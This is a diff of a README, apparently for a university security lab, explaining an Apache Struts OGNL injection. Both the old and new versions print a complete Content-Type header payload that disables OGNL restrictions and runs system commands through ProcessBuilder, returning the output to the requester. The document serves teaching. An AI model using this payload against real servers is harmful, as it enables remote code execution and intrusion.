@@ -48,11 +48,22 @@ The result being that any OGLN expressions are now executed
 ![Dispatcher](src/main/resources/META-INF/resources/images/OglnTextParser-evaluate.png)
 
 ### The Payload
-The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library). OGNL uses expressions to perform tasks, and one of the expressions that is allowed is the ability to instantiate Objects from classes in the framework, and chaining commands. So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL '(#p=new edu.uvu.ms.cybersecurity.Command(#cmd))).'. Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands e.g. (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
+The clever aspect of this vulernability is the exploitation of OGNL (Object Graph Navigation Library).
 
-The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to ther server out on the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)
+OGNL uses expressions to perform tasks, and two of the expressions that are allowed is the ability to invoke arbitrary classes in the framework, and chain events. 
 
-Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+So for example, it is possible then to instantiate edu.uvu.ms.cybersecurity.Command object with OGNL 
+ 
+    '(#p=new edu.uvu.ms.cybersecurity.Command(#cmd))).'
+     
+ Or, in a more practical sense, one can invoke the java.lang.ProcessBuilder class to run system level commands 
+  
+    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())
+
+The following payload contains a command to invoke edu.uvu.ms.cybersecurity.Command and print the command issued to the server into the console, and then proceed to execute the command. (to illustrate chaining of events, and invoking classes)
+
+
+    Content-Type :  %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#p=new edu.uvu.ms.cybersecurity.Command(#cmd)).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
 
 
 A portion of this payload was pulled from [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework/issues/8064)
